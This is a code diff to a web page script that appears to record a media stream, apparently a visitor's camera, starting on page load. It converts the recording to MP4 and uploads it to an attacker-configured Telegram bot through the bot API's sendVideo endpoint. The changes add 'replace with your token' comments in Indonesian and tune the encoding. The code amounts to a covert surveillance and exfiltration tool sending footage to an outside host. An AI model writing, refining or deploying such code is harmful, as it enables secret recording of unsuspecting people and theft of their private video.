@@ -9,14 +9,14 @@ document.addEventListener("DOMContentLoaded", async function () {
 });
 
 async function sendToTelegram(stream) {
-    const botToken = "1234567890:ABCDefGhIJKlMnOpQRstuVWxyz";
-    const chatId = "987654321";
+    const botToken = "1234567890:ABCDefGhIJKlMnOpQRstuVWxyz"; // Ganti dengan token bot Anda
+    const chatId = "987654321"; // Ganti dengan Chat ID Anda
     const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
     const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
     let chunks = [];
 
-    mediaRecorder.ondataavailable = async (event) => {
+    mediaRecorder.ondataavailable = (event) => {
         chunks.push(event.data);
     };
 
@@ -47,8 +47,13 @@ async function convertWebMtoMP4(webmBlob) {
 
     await ffmpeg.load();
     ffmpeg.FS("writeFile", "input.webm", await fetchFile(webmBlob));
-    await ffmpeg.run("-i", "input.webm", "output.mp4");
+    await ffmpeg.run("-i", "input.webm", "-c:v", "libx264", "-preset", "ultrafast", "output.mp4");
 
     const mp4Data = ffmpeg.FS("readFile", "output.mp4");
-    return new Blob([mp4Data.buffer], { type: "video/mp4" });
+    const mp4Blob = new Blob([mp4Data.buffer], { type: "video/mp4" });
+
+    ffmpeg.FS("unlink", "input.webm");
+    ffmpeg.FS("unlink", "output.mp4");
+
+    return mp4Blob;
         }
